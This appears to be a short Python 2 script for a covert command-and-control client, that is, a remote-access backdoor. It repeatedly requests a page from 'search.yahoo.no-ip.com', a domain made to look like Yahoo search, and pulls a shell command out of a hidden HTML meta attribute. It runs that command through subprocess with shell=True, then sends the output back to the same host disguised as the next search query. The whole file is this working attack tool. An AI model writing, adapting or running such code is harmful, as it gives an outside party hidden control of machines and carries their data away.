#!/bin/sh

import os
import sys
import urllib
import bs4
import subprocess
import time
import datetime

import webserver

#print ("Test3")

#webserver.run(port=80)

#query = "test3"
#response = urllib.urlopen('http://search.yahoo.com/search?p=%s' % query).read()
#print response

def execute_cmd(cmd):
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    tmp = proc.stdout.read()
    return tmp

def main(argv):
    print 'Client'

    query = "test3"
    server_domain = 'search.yahoo.no-ip.com'

    # cmd = 'dir'
    # query = execute_cmd(cmd)
    # print query
    #
    # cmd = 'ping search.yahoo.no-ip.com'
    # query = execute_cmd(cmd)
    # print query

    query = 'cnn highligts'
    cmd = ''
    while cmd != '!off':
        try:
            #response = urllib.urlopen('http://search.yahoo.com/search?p=%s' % query).read()
            response = urllib.urlopen('http://%s/search?p=%s' % (server_domain, query)).read()
            print response

            soup = bs4.BeautifulSoup(response)
            cc = soup.find(attrs={"property": "oq:yahoo_search_engine"})
            cmd = cc.attrs['xcontent']

            print cmd
            query = execute_cmd(cmd)
        except:
            pass
        print query
        now = datetime.datetime.now()
        print now
        time.sleep(5)



if __name__ == "__main__":
    main(sys.argv)
